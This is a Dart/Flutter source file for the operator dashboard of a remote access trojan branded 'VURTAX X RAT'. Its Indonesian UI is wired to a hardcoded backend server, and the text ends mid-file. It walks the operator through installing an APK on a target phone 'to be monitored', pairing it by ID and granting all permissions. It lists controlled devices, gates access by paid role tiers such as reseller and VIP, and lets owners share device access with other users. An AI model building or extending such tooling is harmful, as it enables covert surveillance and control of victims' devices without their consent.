import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http; // ✅ Benar (menggunakan package eksternal)
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';

const _kBase = 'http://cp.zyrostore.id:3594';

// ============================================================================
// VURTAX X RAT THEME COLORS
// ============================================================================
class DashboardTheme {
  static const bg            = Color(0xFFDCEEFB);
  static const card          = Color(0xFFFFFFFF);
  static const cardAlt       = Color(0xFFF0F7FF);
  static const border        = Color(0xFF42A5F5);
  static const red           = Color(0xFF1565C0);
  static const cyan          = Color(0xFF1565C0);
  static const green         = Color(0xFF1565C0);
  static const pink          = Color(0xFF1565C0);
  static const orange        = Color(0xFF1565C0);
  static const blue          = Color(0xFF1565C0);
  static const purple        = Color(0xFF1565C0);
  static const yellow        = Color(0xFF1565C0);
  static const white         = Color(0xFFFFFFFF);
  static const white54       = Color(0x8A000000);
  static const white24       = Color(0x3D000000);
  static const liveBlue      = Color(0xFF1565C0);
  static const liveRed       = Color(0xFF1565C0);
  static const liveYellow    = Color(0xFF1565C0);

  static const surface        = Color(0xFFFFFFFF);
  static const surface2       = Color(0xFFF0F7FF);
  static const surface3       = Color(0xFFE3F0FF);
  static const cardDark       = Color(0xFFF5F9FF);
  
  static const accent1        = Color(0xFF1565C0);
  static const accent2        = Color(0xFF42A5F5);
  static const accent3        = Color(0xFF1565C0);
  static const success        = Color(0xFF1565C0);
  static const warning        = Color(0xFF1565C0);
  static const error          = Color(0xFF1565C0);
  
  static const textPrimary    = Color(0xFF000000);
  static const textSecondary  = Color(0xFF3D6080);
  static const textMuted      = Color(0xFF8A9BB0);
  
  static const shadow         = Color(0x40000000);
  static const shadowHeavy    = Color(0x80000000);
  
  static const red1 = red;
  static const red2 = border;
  static const red3 = red;
  static const red4 = red;
  static const gold = border;
  static const silver = textMuted;
  static const chrome = cardAlt;
}

// ============================================================================
// ROLE HELPERS
// ============================================================================
const List<String> allRoles = [
  'developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin', 'reseller', 'vip', 'member'
];

const Map<String, int> roleLevel = {
  'developer': 10,
  'founder': 9,
  'kingz': 8,
  'high owner': 7,
  'owner': 6,
  'tk': 5,
  'admin': 4,
  'reseller': 3,
  'vip': 2,
  'member': 1,
};

IconData roleIcon(String role) {
  switch (role.toLowerCase()) {
    case 'developer': return Icons.code_rounded;
    case 'founder':   return Icons.workspace_premium_rounded;
    case 'kingz':     return Icons.emoji_events;
    case 'high owner':return Icons.stars_rounded;
    case 'owner':     return Icons.workspace_premium_rounded;
    case 'tk':        return Icons.security_rounded;
    case 'admin':     return Icons.admin_panel_settings_rounded;
    case 'reseller':  return Icons.storefront_rounded;
    case 'vip':       return Icons.star_rounded;
    case 'member':    return Icons.person_rounded;
    default:          return Icons.person_rounded;
  }
}

String roleDisplayName(String role) {
  switch (role.toLowerCase()) {
    case 'developer': return 'Developer';
    case 'founder':   return 'Founder';
    case 'kingz':     return 'Kingz';
    case 'high owner':return 'High Owner';
    case 'owner':     return 'Owner';
    case 'tk':        return 'TK';
    case 'admin':     return 'Admin';
    case 'reseller':  return 'Reseller';
    case 'vip':       return 'VIP';
    case 'member':    return 'Member';
    default:          return role.toUpperCase();
  }
}

bool isRoleAtLeast(String role, String target) {
  final rLevel = roleLevel[role.toLowerCase()] ?? 0;
  final tLevel = roleLevel[target.toLowerCase()] ?? 0;
  return rLevel >= tLevel;
}

// ============================================================================
// RAT PERMISSION RULES
// ============================================================================
const List<String> allowedRatRoles = [
  'developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin'
];

const List<String> deniedRatRoles = [
  'member', 'vip', 'reseller'
];

bool canAccessRAT(String role) {
  return allowedRatRoles.contains(role.toLowerCase());
}

bool isDeniedAccess(String role) {
  return deniedRatRoles.contains(role.toLowerCase());
}

// ============================================================================
// SHADOW UTILITIES
// ============================================================================
class ShadowUtils {
  static List<BoxShadow> get soft {
    return const [
      BoxShadow(color: DashboardTheme.shadow, blurRadius: 8, offset: Offset(0, 2)),
      BoxShadow(color: DashboardTheme.shadowHeavy, blurRadius: 2, offset: Offset(0, 1)),
    ];
  }
  
  static List<BoxShadow> get medium {
    return const [
      BoxShadow(color: DashboardTheme.shadow, blurRadius: 16, offset: Offset(0, 4)),
      BoxShadow(color: DashboardTheme.shadowHeavy, blurRadius: 4, offset: Offset(0, 2)),
    ];
  }
  
  static List<BoxShadow> get heavy {
    return const [
      BoxShadow(color: DashboardTheme.shadow, blurRadius: 24, offset: Offset(0, 8)),
      BoxShadow(color: DashboardTheme.shadowHeavy, blurRadius: 8, offset: Offset(0, 4)),
      BoxShadow(color: DashboardTheme.shadowHeavy, blurRadius: 2, offset: Offset(0, 1)),
    ];
  }
  
  static List<BoxShadow> get card {
    return const [
      BoxShadow(color: DashboardTheme.shadowHeavy, blurRadius: 20, offset: Offset(0, 10)),
      BoxShadow(color: DashboardTheme.shadow, blurRadius: 6, offset: Offset(0, 2)),
    ];
  }
}

// ============================================================================
// PAGE 1: PAIRING INFO & TUTORIAL
// ============================================================================
class _PairingInfoPage extends StatelessWidget {
  final String pairId;
  final VoidCallback onCopy;
  final bool isOwner;
  
  const _PairingInfoPage({
    required this.pairId,
    required this.onCopy,
    required this.isOwner,
  });

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      physics: const BouncingScrollPhysics(),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                colors: [DashboardTheme.red, DashboardTheme.border, DashboardTheme.red],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(16),
              boxShadow: ShadowUtils.heavy,
              border: Border.all(
                color: DashboardTheme.border.withOpacity(0.3),
                width: 1,
              ),
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(
                      color: DashboardTheme.border.withOpacity(0.3),
                      width: 0.5,
                    ),
                  ),
                  child: const Icon(Icons.link_rounded, color: Colors.white, size: 28),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text(
                        'PAIRING ID',
                        style: TextStyle(
                          color: Colors.white70,
                          fontSize: 11,
                          letterSpacing: 2,
                          fontWeight: FontWeight.w600,
                          fontFamily: 'Astral',
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        pairId.isEmpty ? 'MEMUAT...' : pairId,
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 22,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 3,
                          fontFamily: 'Astral',
                        ),
                      ),
                    ],
                  ),
                ),
                if (pairId.isNotEmpty)
                  GestureDetector(
                    onTap: onCopy,
                    child: Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(14),
                        border: Border.all(
                          color: DashboardTheme.border.withOpacity(0.3),
                          width: 0.5,
                        ),
                      ),
                      child: const Icon(Icons.copy_rounded, color: Colors.white, size: 20),
                    ),
                  ),
              ],
            ),
          ),
          
          const SizedBox(height: 24),
          
          Text(
            'CARA MENAUTKAN DEVICE',
            style: TextStyle(
              color: DashboardTheme.textSecondary,
              fontSize: 12,
              letterSpacing: 1.5,
              fontWeight: FontWeight.w600,
              fontFamily: 'Astral',
            ),
          ),
          
          const SizedBox(height: 16),
          
          const _StepCard(
            number: 1,
            title: 'INSTALL APK',
            description: 'Install aplikasi target di perangkat yang ingin dipantau',
            icon: Icons.download_rounded,
            gradient: [DashboardTheme.red, DashboardTheme.border],
          ),
          
          const SizedBox(height: 12),
          
          const _StepCard(
            number: 2,
            title: 'MASUKKAN PAIRING ID',
            description: 'Buka aplikasi lalu masukkan ID di atas',
            icon: Icons.qr_code_scanner_rounded,
            gradient: [DashboardTheme.border, DashboardTheme.red],
          ),
          
          const SizedBox(height: 12),
          
          const _StepCard(
            number: 3,
            title: 'BERI IZIN AKSES',
            description: 'Izinkan semua permission yang diminta',
            icon: Icons.security_rounded,
            gradient: [DashboardTheme.red, DashboardTheme.border],
          ),
          
          const SizedBox(height: 12),
          
          const _StepCard(
            number: 4,
            title: 'SELESAI',
            description: 'Device akan muncul di halaman Devices',
            icon: Icons.check_circle_rounded,
            gradient: [DashboardTheme.success, DashboardTheme.border],
          ),
          
          const SizedBox(height: 24),
          
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [DashboardTheme.surface2, DashboardTheme.surface3],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: DashboardTheme.red.withOpacity(0.2),
                width: 1.5,
              ),
              boxShadow: ShadowUtils.medium,
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [DashboardTheme.red, DashboardTheme.border],
                    ),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: const Icon(Icons.info_rounded, color: Colors.white, size: 24),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'CATATAN PENTING',
                        style: TextStyle(
                          color: DashboardTheme.border,
                          fontSize: 11,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 1,
                          fontFamily: 'Astral',
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        'ID Pairing hanya dimiliki Owner. Jangan bagikan ke orang yang tidak dikenal.',
                        style: TextStyle(
                          color: DashboardTheme.textMuted,
                          fontSize: 12,
                          fontFamily: 'Astral',
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          
          if (!isOwner) ...[
            const SizedBox(height: 16),
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: DashboardTheme.warning.withOpacity(0.08),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(
                  color: DashboardTheme.warning.withOpacity(0.2),
                  width: 1.5,
                ),
              ),
              child: Row(
                children: [
                  const Icon(Icons.lock_rounded, color: DashboardTheme.warning, size: 20),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      'Anda bukan Owner, ID Pairing tidak tersedia. Hubungi Owner untuk mendapat akses.',
                      style: TextStyle(
                        color: DashboardTheme.warning,
                        fontSize: 12,
                        fontFamily: 'Astral',
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }
}

class _StepCard extends StatelessWidget {
  final int number;
  final String title;
  final String description;
  final IconData icon;
  final List<Color> gradient;
  
  const _StepCard({
    required this.number,
    required this.title,
    required this.description,
    required this.icon,
    required this.gradient,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [DashboardTheme.surface2, DashboardTheme.surface3],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        boxShadow: ShadowUtils.soft,
        border: Border.all(
          color: DashboardTheme.red.withOpacity(0.1),
          width: 0.5,
        ),
      ),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Row(
          children: [
            Container(
              width: 48,
              height: 48,
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: gradient),
                borderRadius: BorderRadius.circular(16),
                boxShadow: ShadowUtils.soft,
                border: Border.all(
                  color: DashboardTheme.border.withOpacity(0.3),
                  width: 0.5,
                ),
              ),
              child: Center(
                child: Text(
                  '$number',
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Astral',
                  ),
                ),
              ),
            ),
            const SizedBox(width: 16),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: DashboardTheme.surface3,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: gradient[0].withOpacity(0.2),
                  width: 0.5,
                ),
              ),
              child: Icon(icon, color: gradient[0], size: 24),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: TextStyle(
                      color: DashboardTheme.textPrimary,
                      fontSize: 14,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Astral',
                    ),
                  ),
                  const SizedBox(height: 2),
                  Text(
                    description,
                    style: TextStyle(
                      color: DashboardTheme.textMuted,
                      fontSize: 11,
                      fontFamily: 'Astral',
                    ),
                  ),
                ],
              ),
            ),
            const Icon(
              Icons.arrow_forward_ios_rounded,
              color: DashboardTheme.textMuted,
              size: 14,
            ),
          ],
        ),
      ),
    );
  }
}

// ============================================================================
// PAGE 2: DEVICE LIST
// ============================================================================
class _DeviceListPage extends StatelessWidget {
  final List<dynamic> devices;
  final String role;
  final bool isOwner;
  final PermissionResult? perm;
  final bool denied;
  
  const _DeviceListPage({
    required this.devices,
    required this.role,
    required this.isOwner,
    required this.perm,
    required this.denied,
  });

  @override
  Widget build(BuildContext context) {
    final activeCount = devices.where((d) => d['online'] == true).length;
    
    return Column(
      children: [
        Container(
          margin: const EdgeInsets.all(20),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [DashboardTheme.surface2, DashboardTheme.surface3],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(16),
            boxShadow: ShadowUtils.soft,
            border: Border.all(
              color: DashboardTheme.red.withOpacity(0.15),
              width: 0.5,
            ),
          ),
          child: Row(
            children: [
              _StatChip(label: 'ONLINE', value: '$activeCount', color: DashboardTheme.success),
              const SizedBox(width: 12),
              _StatChip(label: 'OFFLINE', value: '${devices.length - activeCount}', color: DashboardTheme.error),
              const Spacer(),
              _StatChip(label: 'TOTAL', value: '${devices.length}', color: DashboardTheme.red),
            ],
          ),
        ),
        
        Expanded(
          child: devices.isEmpty
              ? _EmptyDeviceWidget(denied: denied, isOwner: isOwner)
              : ListView.builder(
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 100),
                  physics: const BouncingScrollPhysics(),
                  itemCount: devices.length,
                  itemBuilder: (ctx, i) {
                    final d = devices[i];
                    final isOnline = d['online'] == true;
                    return Padding(
                      padding: const EdgeInsets.only(bottom: 12),
                      child: _DeviceCard(
                        device: d,
                        isOnline: isOnline,
                        role: role,
                      ),
                    );
                  },
                ),
        ),
      ],
    );
  }
}

class _StatChip extends StatelessWidget {
  final String label;
  final String value;
  final Color color;
  
  const _StatChip({
    required this.label,
    required this.value,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: color.withOpacity(0.08),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: color.withOpacity(0.2),
          width: 1,
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: BoxDecoration(
              color: color,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(color: color, blurRadius: 4),
              ],
            ),
          ),
          const SizedBox(width: 6),
          Text(
            label,
            style: TextStyle(
              color: DashboardTheme.textMuted,
              fontSize: 10,
              fontFamily: 'Astral',
            ),
          ),
          const SizedBox(width: 4),
          Text(
            value,
            style: TextStyle(
              color: color,
              fontSize: 14,
              fontWeight: FontWeight.bold,
              fontFamily: 'Astral',
            ),
          ),
        ],
      ),
    );
  }
}

class _DeviceCard extends StatelessWidget {
  final dynamic device;
  final bool isOnline;
  final String role;
  
  const _DeviceCard({
    required this.device,
    required this.isOnline,
    required this.role,
  });

  @override
  Widget build(BuildContext context) {
    final statusColor = isOnline ? DashboardTheme.success : DashboardTheme.error;
    final roleIconData = roleIcon(role);
    final roleDisplay = roleDisplayName(role);
    
    return GestureDetector(
      onTap: () => Navigator.push(
        context,
        MaterialPageRoute(
          builder: (_) => ControlCenterPage(targetDevice: device, role: role),
        ),
      ),
      child: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [DashboardTheme.surface2, DashboardTheme.surface3],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
          boxShadow: ShadowUtils.card,
          border: Border.all(
            color: isOnline 
                ? statusColor.withOpacity(0.3) 
                : DashboardTheme.red.withOpacity(0.08),
            width: isOnline ? 1.5 : 0.5,
          ),
        ),
        child: Stack(
          children: [
            if (isOnline)
              Container(
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(20),
                  gradient: LinearGradient(
                    colors: [statusColor.withOpacity(0.06), Colors.transparent],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                ),
              ),
            Padding(
              padding: const EdgeInsets.all(14),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: isOnline 
                            ? [DashboardTheme.red, DashboardTheme.border]
                            : [DashboardTheme.surface3, DashboardTheme.surface3],
                      ),
                      borderRadius: BorderRadius.circular(14),
                      boxShadow: ShadowUtils.soft,
                      border: Border.all(
                        color: isOnline 
                            ? DashboardTheme.border.withOpacity(0.3)
                            : DashboardTheme.surface3,
                        width: 0.5,
                      ),
                    ),
                    child: Icon(
                      Icons.phone_android_rounded,
                      color: isOnline ? Colors.white : DashboardTheme.textMuted,
                      size: 24,
                    ),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            Expanded(
                              child: Text(
                                device['model'] ?? 'Unknown Device',
                                style: TextStyle(
                                  color: isOnline ? DashboardTheme.textPrimary : DashboardTheme.textSecondary,
                                  fontSize: 13,
                                  fontWeight: FontWeight.bold,
                                  fontFamily: 'Astral',
                                ),
                                maxLines: 1,
                                overflow: TextOverflow.ellipsis,
                              ),
                            ),
                            const SizedBox(width: 8),
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: DashboardTheme.red.withOpacity(0.08),
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(
                                  color: DashboardTheme.red.withOpacity(0.15),
                                ),
                              ),
                              child: Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  Icon(roleIconData, color: DashboardTheme.red, size: 10),
                                  const SizedBox(width: 2),
                                  Text(
                                    roleDisplay,
                                    style: TextStyle(
                                      color: DashboardTheme.red,
                                      fontSize: 7,
                                      fontWeight: FontWeight.w600,
                                      fontFamily: 'Astral',
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 3),
                        Text(
                          device['id'] ?? 'ID: ---',
                          style: TextStyle(
                            color: DashboardTheme.textMuted,
                            fontSize: 10,
                            fontFamily: 'Astral',
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                        const SizedBox(height: 6),
                        Row(
                          children: [
                            const Icon(
                              Icons.battery_charging_full_rounded,
                              color: DashboardTheme.textMuted,
                              size: 12,
                            ),
                            const SizedBox(width: 4),
                            Text(
                              '${device['battery'] ?? '?'}%',
                              style: TextStyle(
                                color: isOnline ? DashboardTheme.textSecondary : DashboardTheme.textMuted,
                                fontSize: 11,
                                fontFamily: 'Astral',
                              ),
                            ),
                            if (!isOnline && device['lastSeen'] != null) ...[
                              const SizedBox(width: 10),
                              Text(
                                _formatLastSeen(device['lastSeen']),
                                style: TextStyle(
                                  color: DashboardTheme.textMuted,
                                  fontSize: 10,
                                  fontFamily: 'Astral',
                                ),
                              ),
                            ],
                          ],
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(width: 10),
                  Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                        decoration: BoxDecoration(
                          color: statusColor.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(
                            color: statusColor.withOpacity(0.2),
                            width: 1,
                          ),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 5,
                              height: 5,
                              decoration: BoxDecoration(
                                color: statusColor,
                                shape: BoxShape.circle,
                                boxShadow: [
                                  BoxShadow(color: statusColor, blurRadius: 4),
                                ],
                              ),
                            ),
                            const SizedBox(width: 4),
                            Text(
                              isOnline ? 'ON' : 'OFF',
                              style: TextStyle(
                                color: statusColor,
                                fontSize: 9,
                                fontWeight: FontWeight.bold,
                                fontFamily: 'Astral',
                              ),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 8),
                      const Icon(
                        Icons.arrow_forward_ios_rounded,
                        color: DashboardTheme.textMuted,
                        size: 14,
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
  
  String _formatLastSeen(String? lastSeenStr) {
    if (lastSeenStr == null) return 'Never';
    try {
      final lastSeen = DateTime.parse(lastSeenStr);
      final diff = DateTime.now().difference(lastSeen);
      if (diff.inSeconds < 60) return '${diff.inSeconds}s ago';
      if (diff.inMinutes < 60) return '${diff.inMinutes}m ago';
      if (diff.inHours < 24) return '${diff.inHours}h ago';
      return '${diff.inDays}d ago';
    } catch (_) {
      return 'Never';
    }
  }
}

class _EmptyDeviceWidget extends StatelessWidget {
  final bool denied;
  final bool isOwner;
  
  const _EmptyDeviceWidget({
    required this.denied,
    required this.isOwner,
  });

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [DashboardTheme.surface2, DashboardTheme.surface3],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              shape: BoxShape.circle,
              boxShadow: ShadowUtils.heavy,
              border: Border.all(
                color: denied ? DashboardTheme.error.withOpacity(0.2) : DashboardTheme.red.withOpacity(0.15),
                width: 1.5,
              ),
            ),
            child: Icon(
              denied ? Icons.lock_rounded : Icons.phone_android_rounded,
              size: 48,
              color: denied ? DashboardTheme.error : DashboardTheme.textMuted,
            ),
          ),
          const SizedBox(height: 24),
          Text(
            denied ? 'AKSES DITOLAK' : 'BELUM ADA DEVICE',
            style: TextStyle(
              color: denied ? DashboardTheme.error : DashboardTheme.textSecondary,
              fontSize: 16,
              fontWeight: FontWeight.bold,
              letterSpacing: 2,
              fontFamily: 'Astral',
            ),
          ),
          const SizedBox(height: 8),
          Text(
            denied 
                ? 'Hubungi Owner untuk mendapatkan izin akses'
                : 'Tautkan device menggunakan ID Pairing di halaman sebelumnya',
            textAlign: TextAlign.center,
            style: TextStyle(
              color: DashboardTheme.textMuted,
              fontSize: 12,
              fontFamily: 'Astral',
            ),
          ),
          const SizedBox(height: 32),
          if (!denied && isOwner)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  colors: [DashboardTheme.red, DashboardTheme.border],
                ),
                borderRadius: BorderRadius.circular(24),
                boxShadow: ShadowUtils.soft,
                border: Border.all(
                  color: DashboardTheme.border.withOpacity(0.3),
                  width: 0.5,
                ),
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  const Icon(Icons.swipe_left_rounded, color: DashboardTheme.border, size: 18),
                  const SizedBox(width: 8),
                  Text(
                    'GESER KE KIRI UNTUK LIHAT PAIRING ID',
                    style: TextStyle(
                      color: DashboardTheme.border,
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Astral',
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }
}

// ============================================================================
// PERMISSION BOTTOM SHEET
// ============================================================================
class _PermissionBottomSheet extends StatefulWidget {
  final String sessionKey;
  final List<dynamic> allDevices;
  
  const _PermissionBottomSheet({
    required this.sessionKey,
    required this.allDevices,
  });

  @override
  State<_PermissionBottomSheet> createState() => _PermissionBottomSheetState();
}

class _PermissionBottomSheetState extends State<_PermissionBottomSheet> {
  Map<String, dynamic> _perms = {};
  String _selectedUser = '';
  final _inputCtrl = TextEditingController();
  String _inputVal = '';
  bool _loading = true;
  bool _saving = false;

  @override
  void initState() {
    super.initState();
    _load();
  }

  @override
  void dispose() {
    _inputCtrl.dispose();
    super.dispose();
  }

  Future<void> _load() async {
    setState(() => _loading = true);
    final data = await DevicePermissionStore.getAll(widget.sessionKey);
    if (mounted) {
      setState(() {
        _perms = data;
        _loading = false;
      });
    }
  }

  List<String> get _users => _perms.keys.toList();
  bool _approved(String u) => _perms[u]?['approved'] == true;
  bool _hasAll(String u) => _perms[u]?['allDevices'] == true;
  List<String> _devices(String u) => List<String>.from(_perms[u]?['devices'] ?? []);

  Future<void> _addUser(String username) async {
    if (username.trim().isEmpty) return;
    final key = username.trim().toLowerCase();
    setState(() => _saving = true);
    final ok = await DevicePermissionStore.setPerm(
      widget.sessionKey, key,
      approved: true, allDevices: true, devices: [],
    );
    if (ok) {
      await _load();
      if (mounted) {
        setState(() {
          _selectedUser = key;
          _inputVal = '';
          _inputCtrl.clear();
          _saving = false;
        });
      }
    } else {
      setState(() => _saving = false);
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Gagal menambahkan user', style: TextStyle(fontFamily: 'Astral'))),
        );
      }
    }
  }

  Future<void> _update(String u, {bool? approved, bool? allDevices, List<String>? devices}) async {
    setState(() => _saving = true);
    final ok = await DevicePermissionStore.setPerm(
      widget.sessionKey, u,
      approved: approved ?? _approved(u),
      allDevices: allDevices ?? _hasAll(u),
      devices: devices ?? _devices(u),
    );
    if (ok) await _load();
    if (mounted) setState(() => _saving = false);
  }

  Future<void> _removeUser(String u) async {
    setState(() => _saving = true);
    final ok = await DevicePermissionStore.removePerm(widget.sessionKey, u);
    if (ok) {
      await _load();
      if (mounted) setState(() {
        if (_selectedUser == u) _selectedUser = '';
        _saving = false;
      });
    } else {
      setState(() => _saving = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: const BoxDecoration(
        borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
      ),
      child: ClipRRect(
        borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
        child: Container(
          height: MediaQuery.of(context).size.height * 0.85,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [DashboardTheme.surface, DashboardTheme.surface2],
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
            ),
            boxShadow: ShadowUtils.heavy,
          ),
          child: Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 12),
                width: 40,
                height: 4,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [DashboardTheme.red, DashboardTheme.border],
                  ),
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Padding(
                padding: const EdgeInsets.fromLTRB(20, 16, 20, 12),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(
                          colors: [DashboardTheme.red, DashboardTheme.border],
                        ),
                        borderRadius: BorderRadius.circular(14),
                        boxShadow: ShadowUtils.soft,
                        border: Border.all(
                          color: DashboardTheme.border.withOpacity(0.3),
                          width: 0.5,
                        ),
                      ),
                      child: const Icon(Icons.admin_panel_settings_rounded, color: Colors.white, size: 22),
                    ),
                    const SizedBox(width: 14),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text(
                            'KELOLA AKSES DEVICE',
                            style: TextStyle(
                              color: DashboardTheme.textPrimary,
                              fontSize: 16,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1,
                              fontFamily: 'Astral',
                            ),
                          ),
                          Text(
                            'Atur user yang dapat mengakses device',
                            style: TextStyle(
                              color: DashboardTheme.textMuted,
                              fontSize: 11,
                              fontFamily: 'Astral',
                            ),
                          ),
                        ],
                      ),
                    ),
                    if (_saving)
                      const SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(
                          color: DashboardTheme.red,
                          strokeWidth: 2,
                        ),
                      ),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: DashboardTheme.surface3,
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(
                            color: DashboardTheme.red.withOpacity(0.2),
                            width: 0.5,
                          ),
                        ),
                        child: const Icon(Icons.close_rounded, color: DashboardTheme.textMuted, size: 20),
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                margin: const EdgeInsets.symmetric(horizontal: 20),
                padding: const EdgeInsets.all(4),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [DashboardTheme.surface2, DashboardTheme.surface3],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(
                    color: DashboardTheme.red.withOpacity(0.2),
                    width: 0.5,
                  ),
                  boxShadow: ShadowUtils.soft,
                ),
                child: Row(
                  children: [
                    Expanded(
                      child: TextField(
                        controller: _inputCtrl,
                        onChanged: (v) => setState(() => _inputVal = v),
                        style: TextStyle(
                          color: DashboardTheme.textPrimary,
                          fontSize: 13,
                          fontFamily: 'Astral',
                        ),
                        decoration: InputDecoration(
                          hintText: 'Username baru...',
